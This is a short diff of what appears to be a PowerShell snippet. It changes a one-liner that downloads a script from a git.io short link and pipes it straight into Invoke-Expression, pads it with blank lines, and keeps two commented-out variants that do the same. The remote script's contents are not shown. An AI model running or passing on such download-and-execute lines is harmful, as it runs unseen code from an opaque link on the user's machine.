@@ -1,5 +1,13 @@
 
-iwr git.io/J13Mt -UseBasicParsing|iex
+
+
+
+
+
+iwr https://git.io/J13Mt -UseBasicParsing|iex
+
+
+
 #iwr https://git.io/J13Mt|iex
 #iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/J13Mt'))
 
